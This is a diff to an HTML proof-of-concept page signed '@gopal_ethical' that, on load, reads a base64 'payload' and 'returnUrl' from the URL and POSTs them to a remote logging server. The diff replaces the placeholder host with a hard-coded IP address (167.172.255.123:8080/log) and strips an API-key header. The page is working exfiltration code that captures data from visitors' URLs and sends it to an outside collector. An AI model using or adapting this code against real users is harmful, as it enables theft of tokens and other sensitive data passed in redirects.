@@ -6,7 +6,7 @@
 </head>
 <body>
     <h1>Poc by @gopal_ethical</h1>
-    <div id="status">Waiting for data...</div>
+    <div id="status">Sending data...</div>
 
     <script>
         async function sendData() {
@@ -14,39 +14,26 @@
             const returnUrl = new URLSearchParams(window.location.search).get("returnUrl");
 
             const dataToSend = {
-                payload: decodePayload(payload),
+                payload: JSON.parse(atob(decodeURIComponent(payload))),
                 returnUrl: returnUrl,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
+                timestamp: new Date().toISOString()
             };
 
             try {
-                const response = await fetch("https://yourvps.com:8080/log", {
+                const response = await fetch("https://167.172.255.123:8080/log", {
                     method: "POST",
-                    headers: { 
-                        "Content-Type": "application/json",
-                        "X-API-Key": "YOUR_SECRET_KEY"  // Must match server
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(dataToSend)
                 });
-                
-                document.getElementById("status").innerHTML = 
+                document.getElementById("status").textContent = 
                     `✅ Data sent! Status: ${response.status}`;
             } catch (err) {
-                document.getElementById("status").innerHTML = 
+                document.getElementById("status").textContent = 
                     `❌ Error: ${err.message}`;
             }
         }
 
-        function decodePayload(base64) {
-            try {
-                return JSON.parse(atob(decodeURIComponent(base64)));
-            } catch (e) {
-                return { error: "Decoding failed", details: e.message };
-            }
-        }
-
-        // Automatically send data when page loads
+        // Start sending when page loads
         window.onload = sendData;
     </script>
 </body>
